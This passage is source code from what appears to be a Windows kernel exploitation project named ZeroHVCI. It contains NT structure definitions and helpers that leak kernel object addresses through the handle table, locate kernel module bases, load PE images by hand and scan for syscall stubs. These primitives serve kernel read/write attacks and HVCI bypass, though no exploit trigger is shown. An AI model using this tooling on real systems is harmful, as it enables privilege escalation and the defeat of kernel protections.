    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef struct _KSYSTEM_PROCESS_INFORMATION
{
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER WorkingSetPrivateSize;
    ULONG HardFaultCount;
    ULONG NumberOfThreadsHighWatermark;
    ULONGLONG CycleTime;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    ULONG BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
    ULONG HandleCount;
    ULONG SessionId;
    ULONG_PTR UniqueProcessKey;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG PageFaultCount;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    SIZE_T QuotaPeakPagedPoolUsage;
    SIZE_T QuotaPagedPoolUsage;
    SIZE_T QuotaPeakNonPagedPoolUsage;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER ReadOperationCount;
    LARGE_INTEGER WriteOperationCount;
    LARGE_INTEGER OtherOperationCount;
    LARGE_INTEGER ReadTransferCount;
    LARGE_INTEGER WriteTransferCount;
    LARGE_INTEGER OtherTransferCount;
    SYSTEM_THREAD_INFORMATION Threads[1];
} KSYSTEM_PROCESS_INFORMATION,
* PKSYSTEM_PROCESS_INFORMATION;

typedef struct _RTL_PROCESS_MODULE_INFORMATION
{
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, * PRTL_PROCESS_MODULE_INFORMATION;

typedef enum _KTHREAD_STATE
{
    Initialized,
    Ready,
    Running,
    Standby,
    Terminated,
    Waiting,
    Transition,
    DeferredReady,
    GateWaitObsolete,
    WaitingForProcessInSwap,
    MaximumThreadState
} KTHREAD_STATE,
* PKTHREAD_STATE;

typedef enum _POOL_TYPE {
    NonPagedPool,
    NonPagedPoolExecute,
    PagedPool,
    NonPagedPoolMustSucceed,
    DontUseThisType,
    NonPagedPoolCacheAligned,
    PagedPoolCacheAligned,
    NonPagedPoolCacheAlignedMustS,
    MaxPoolType,
    NonPagedPoolBase,
    NonPagedPoolBaseMustSucceed,
    NonPagedPoolBaseCacheAligned,
    NonPagedPoolBaseCacheAlignedMustS,
    NonPagedPoolSession,
    PagedPoolSession,
    NonPagedPoolMustSucceedSession,
    DontUseThisTypeSession,
    NonPagedPoolCacheAlignedSession,
    PagedPoolCacheAlignedSession,
    NonPagedPoolCacheAlignedMustSSession,
    NonPagedPoolNx,
    NonPagedPoolNxCacheAligned,
    NonPagedPoolSessionNx
} POOL_TYPE;

typedef struct _RTL_PROCESS_MODULES
{
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, * PRTL_PROCESS_MODULES;

typedef NTSTATUS(NTAPI* PNtFsControlFile)(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    ULONG FsControlCode,
    PVOID InputBuffer,
    ULONG InputBufferLength,
    PVOID OutputBuffer,
    ULONG OutputBufferLength);

typedef NTSTATUS(NTAPI* pNtReadVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    ULONG NumberOfBytesToRead,
    PULONG NumberOfBytesReaded
    );

typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    ULONG NumberOfBytesToWrite,
    PULONG NumberOfBytesWritten
    );

pNtReadVirtualMemory NtReadVirtualMemory = nullptr;
pNtWriteVirtualMemory NtWriteVirtualMemory = nullptr;
PNtFsControlFile NtFsControlFile = nullptr;
```

`ZeroHVCI/utils.h`:

```h
#pragma once
#define RVATOVA(_base_, _offset_) ((PUCHAR)(_base_) + (ULONG)(_offset_))

DWORD_PTR m_KernelAddr = NULL;
PVOID m_KernelImage = NULL;

bool MatchSign(PUCHAR Data, PUCHAR Sign, int Size)
{
    for (int i = 0; i < Size; i++) {
        if (Sign[i] == 0xff) {
            continue;
        }
        if (Sign[i] != Data[i]) {
            return false;
        }
    }
    return true;
}

ULONG64 GetKernelObject(ULONG TargetProcessId, HANDLE TargetHandle)
{
    NTSTATUS Status = 0;
    ULONG64 Result = 0;

    PSYSTEM_HANDLE_INFORMATION pHandleInfo = nullptr;
    ULONG ulBytes = 0;

    while ((Status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)16, pHandleInfo, ulBytes, &ulBytes)) == 0xC0000004L)
    {
        if (pHandleInfo != nullptr)
        {
            pHandleInfo = reinterpret_cast<PSYSTEM_HANDLE_INFORMATION>(HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pHandleInfo, (size_t)2 * ulBytes));
        }
        else
        {
            pHandleInfo = reinterpret_cast<PSYSTEM_HANDLE_INFORMATION>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (size_t)2 * ulBytes));
        }
    }

    if (Status != 0) {
        goto done;
    }

    for (ULONG i = 0; i < pHandleInfo->NumberOfHandles; i++)
    {
        if ((pHandleInfo->Handles[i].UniqueProcessId == TargetProcessId) && (pHandleInfo->Handles[i].HandleValue == reinterpret_cast<USHORT>(TargetHandle)))
        {
            Result = reinterpret_cast<ULONG64>(pHandleInfo->Handles[i].Object);
            break;
        }
    }

done:
    if (pHandleInfo != nullptr)
    {
        HeapFree(GetProcessHeap(), 0, pHandleInfo);
    }

    return Result;
}

PVOID GetSystemInformation(SYSTEM_INFORMATION_CLASS InfoClass)
{
    NTSTATUS Status = 0;
    ULONG RetSize = 0, Size = 0x100;
    PVOID Info = NULL;

    while (true) {
        RetSize = 0;

        if ((Info = LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, Size)) == NULL) {
            return NULL;
        }

        if ((Status = NtQuerySystemInformation(InfoClass, Info, Size, &RetSize)) == STATUS_INFO_LENGTH_MISMATCH) {
            LocalFree(Info);

            Size = RetSize + 0x100;
        }
        else {
            break;
        }
    }

    if (!NT_SUCCESS(Status)) {
        if (Info) {
            LocalFree(Info);
        }
        return NULL;
    }

    return Info;
}

DWORD GetThreadState(DWORD dwProcessId, DWORD dwThreadId)
{
    DWORD Ret = -1;

    PKSYSTEM_PROCESS_INFORMATION ProcessInfo =
        (PKSYSTEM_PROCESS_INFORMATION)GetSystemInformation(SystemProcessInformation);

    if (ProcessInfo) {
        PKSYSTEM_PROCESS_INFORMATION Info = ProcessInfo;

        while (true) {
            if (Info->UniqueProcessId == (HANDLE)dwProcessId) {
                for (DWORD i = 0; i < Info->NumberOfThreads; i++) {
                    if (Info->Threads[i].ClientId.UniqueThread == (HANDLE)dwThreadId) {
                        Ret = Info->Threads[i].ThreadState;
                        goto _end;
                    }
                }
                break;
            }
            if (Info->NextEntryOffset == 0) {
                break;
            }
            Info = (PKSYSTEM_PROCESS_INFORMATION)RVATOVA(Info, Info->NextEntryOffset);
        }
    _end:
        LocalFree(ProcessInfo);
    }

    return Ret;
}

PVOID GetObjectAddress(HANDLE hObject)
{
    PVOID Ret = NULL;

    PSYSTEM_HANDLE_INFORMATION HandleInfo =
        (PSYSTEM_HANDLE_INFORMATION)GetSystemInformation((SYSTEM_INFORMATION_CLASS)16);

    if (HandleInfo) {
        for (DWORD i = 0; i < HandleInfo->NumberOfHandles; i++) {
            if (HandleInfo->Handles[i].UniqueProcessId == GetCurrentProcessId() &&
                HandleInfo->Handles[i].HandleValue == (USHORT)hObject) {
                Ret = HandleInfo->Handles[i].Object;
                break;
            }
        }

        LocalFree(HandleInfo);
    }

    return Ret;
}

PVOID GetKernelModule(const char* DriverName)
{
    LPVOID driverList[1024];
    DWORD needed;

    if (EnumDeviceDrivers(driverList, sizeof(driverList), &needed)) {
        int numDrivers = needed / sizeof(LPVOID);

        // Iterate through the list of drivers.
        for (int i = 0; i < numDrivers; ++i) {
            char driverPath[MAX_PATH];
            if (GetDeviceDriverBaseNameA(driverList[i], driverPath, sizeof(driverPath))) {
                if (strcmp(driverPath, DriverName) == 0) {
                    return driverList[i];
                }
            }
        }
    }

    return 0;
}

bool GetKernelImageInfo(PVOID* pImageAddress, PDWORD pdwImageSize, char* lpszName)
{
    PRTL_PROCESS_MODULES Info = (PRTL_PROCESS_MODULES)GetSystemInformation((SYSTEM_INFORMATION_CLASS)11);
    if (Info && Info->NumberOfModules > 0) {
        PRTL_PROCESS_MODULE_INFORMATION Module = &Info->Modules[0];

        *pImageAddress = Module->ImageBase;
        *pdwImageSize = Module->ImageSize;

        strcpy_s(lpszName, MAX_PATH, (char*)(Module->FullPathName + Module->OffsetToFileName));

        LocalFree(Info);

        return true;
    }

    return false;
}

bool GetSyscallNumber(const char* lpszProcName, PDWORD pdwRet)
{
    HMODULE hImage = GetModuleHandleA("ntdll.dll");
    if (hImage == NULL) {
        return false;
    }

    PUCHAR Addr = (PUCHAR)GetProcAddress(hImage, lpszProcName);
    if (Addr == NULL) {
        return false;
    }

    if (*(Addr + 3) == 0xb8) {
        *pdwRet = *(PDWORD)(Addr + 4);
        return true;
    }

    return false;
}

DWORD LdrGetProcAddress(PVOID Image, const char* lpszName)
{
    auto pHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(RVATOVA(
        Image, reinterpret_cast<PIMAGE_DOS_HEADER>(Image)->e_lfanew));

    DWORD addr = 0;
    DWORD exportAddr = pHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD exportSize = pHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

    if (exportAddr != 0) {
        auto pExport = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(RVATOVA(Image, exportAddr));

        if (pExport->AddressOfFunctions == 0 ||
            pExport->AddressOfNameOrdinals == 0 ||
            pExport->AddressOfNames == 0) {
            return 0;
        }

        auto addrOfFunctions = reinterpret_cast<PDWORD>(RVATOVA(Image, pExport->AddressOfFunctions));
        auto addrOfOrdinals = reinterpret_cast<PWORD>(RVATOVA(Image, pExport->AddressOfNameOrdinals));
        auto addrOfNames = reinterpret_cast<PDWORD>(RVATOVA(Image, pExport->AddressOfNames));

        for (DWORD i = 0; i < pExport->NumberOfNames; ++i) {
            auto exportName = reinterpret_cast<const char*>(RVATOVA(Image, addrOfNames[i]));

            if (strcmp(exportName, lpszName) == 0) {
                addr = addrOfFunctions[addrOfOrdinals[i]];
                break;
            }
        }
    }
    else {
        return 0;
    }

    if (addr != 0) {
        if (addr > exportAddr && addr < exportAddr + exportSize) {
            return 0;
        }
        return addr;
    }

    return 0;
}

bool LdrProcessRelocs(PVOID Image, PVOID NewBase)
{
    PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)RVATOVA(Image, ((PIMAGE_DOS_HEADER)Image)->e_lfanew);

    DWORD_PTR OldBase = pHeaders->OptionalHeader.ImageBase;
    DWORD RelocAddr = pHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    DWORD RelocSize = pHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

    if (RelocAddr == 0)
    {
        return true;
    }

    DWORD Size = 0;
    PIMAGE_BASE_RELOCATION pRelocation = (PIMAGE_BASE_RELOCATION)RVATOVA(Image, RelocAddr);

    while (RelocSize > Size && pRelocation->SizeOfBlock)
    {
        DWORD Num = (pRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        PWORD Rel = (PWORD)RVATOVA(pRelocation, sizeof(IMAGE_BASE_RELOCATION));

        for (DWORD i = 0; i < Num; i += 1)
        {
            if (Rel[i] > 0)
            {
                WORD Type = (Rel[i] & 0xF000) >> 12;

                if (Type != IMAGE_REL_BASED_DIR64 &&
                    Type != IMAGE_REL_BASED_ABSOLUTE)
                {
                    return false;
                }

                if (Type == IMAGE_REL_BASED_DIR64)
                {
                    *(PDWORD64)(RVATOVA(
                        Image,
                        pRelocation->VirtualAddress + (Rel[i] & 0x0FFF))) += (DWORD64)NewBase - OldBase;
                }
            }
        }

        pRelocation = (PIMAGE_BASE_RELOCATION)RVATOVA(pRelocation, pRelocation->SizeOfBlock);
        Size += pRelocation->SizeOfBlock;
    }

    return true;
}

bool LdrMapImage(PVOID Data, DWORD dwDataSize, PVOID* pImage, PDWORD pdwImageSize)
{
    PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)RVATOVA(Data, ((PIMAGE_DOS_HEADER)Data)->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)RVATOVA(&pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader);

    DWORD dwImageSize = pHeaders->OptionalHeader.SizeOfImage;

    PVOID Image = LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, dwImageSize);

    if (Image)
    {
        ZeroMemory(Image, dwImageSize);
        CopyMemory(Image, Data, pHeaders->OptionalHeader.SizeOfHeaders);

        for (DWORD i = 0; i < pHeaders->FileHeader.NumberOfSections; i += 1)
        {
            memcpy(
                RVATOVA(Image, pSection->VirtualAddress),
                RVATOVA(Data, pSection->PointerToRawData),
                min(pSection->SizeOfRawData, pSection->Misc.VirtualSize)
            );

            pSection += 1;
        }

        *pImage = Image;
        *pdwImageSize = dwImageSize;

        return true;
    }

    return false;
}

bool ReadFromFile(HANDLE hFile, PVOID* pData, PDWORD pdwDataSize)
{
    bool bRet = FALSE;

    DWORD dwDataSizeHigh = 0;
    DWORD dwDataSize = GetFileSize(hFile, &dwDataSizeHigh);

    if (dwDataSize > 0)
    {
        if (dwDataSizeHigh != 0)
        {
            return false;
        }

        PVOID Data = LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, dwDataSize);

        if (Data)
        {
            DWORD dwReaded = 0;

            SetFilePointer(hFile, 0, NULL, FILE_BEGIN);

            if (ReadFile(hFile, Data, dwDataSize, &dwReaded, NULL))
            {
                *pData = Data;
                *pdwDataSize = dwDataSize;

                bRet = true;
            }
            else
            {
                LocalFree(Data);
            }
        }
    }

    return bRet;
}

bool ReadFromFile(LPCSTR lpszFileName, PVOID* pData, PDWORD pdwDataSize)
{
    bool bRet = false;

    HANDLE hFile = CreateFileA(
        lpszFileName, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL, OPEN_EXISTING, 0, NULL
    );

    if (hFile != INVALID_HANDLE_VALUE)
    {
        if (pData == NULL || pdwDataSize == NULL)
        {
            bRet = true;
        }
        else
        {
            bRet = ReadFromFile(hFile, pData, pdwDataSize);
        }

        CloseHandle(hFile);
    }

    return bRet;
}

void* GetKernelProcAddress(const char* procName)
{
    if (!m_KernelImage || !m_KernelAddr) {
        return nullptr;
    }

    DWORD offset = LdrGetProcAddress(m_KernelImage, procName);
    if (offset) {
        return RVATOVA(m_KernelAddr, offset);
    }

    return nullptr;
}

void* GetKernelZwProcAddress(const char* procName)
{
    void* addr = nullptr;
    DWORD syscallNumber = 0;

    if (!m_KernelImage || !m_KernelAddr) {
        return nullptr;
    }

    if (!GetSyscallNumber(procName, &syscallNumber)) {
        return nullptr;
    }

    auto headers = reinterpret_cast<PIMAGE_NT_HEADERS>(
        RVATOVA(m_KernelImage, reinterpret_cast<PIMAGE_DOS_HEADER>(m_KernelImage)->e_lfanew)
        );
    auto section = reinterpret_cast<PIMAGE_SECTION_HEADER>(
        RVATOVA(&headers->OptionalHeader, headers->FileHeader.SizeOfOptionalHeader)
        );

    for (DWORD i = 0; i < headers->FileHeader.NumberOfSections; ++i) {
        if ((section->Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
            !(section->Characteristics & IMAGE_SCN_MEM_DISCARDABLE)) {

            for (DWORD n = 0; n < section->Misc.VirtualSize - 0x100; ++n) {
                DWORD ptr = section->VirtualAddress + n;
                UCHAR sign[] = {
                    0x48, 0x8B, 0xC4, // mov rax, rsp
                    0xFA,             // cli
                    0x48, 0x83, 0xEC, 0x10, // sub rsp, 10h
                    0x50,             // push rax
                    0x9C,             // pushfq
                    0x6A, 0x10,       // push 10h
                    0x48, 0x8D, 0x05, 0xFF, 0xFF, 0xFF, 0xFF, // lea rax, KiServiceLinkage
                    0x50,             // push rax
                    0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, XXXXXXXX
                    0xE9, 0xFF, 0xFF, 0xFF, 0xFF  // jmp KiServiceInternal
                };

                *reinterpret_cast<PDWORD>(sign + 0x15) = syscallNumber;

                if (MatchSign(RVATOVA(m_KernelImage, ptr), sign, sizeof(sign) - 1)) {
                    addr = RVATOVA(m_KernelAddr, ptr);
                }
            }
        }

        ++section;
    }

    return addr;
}

```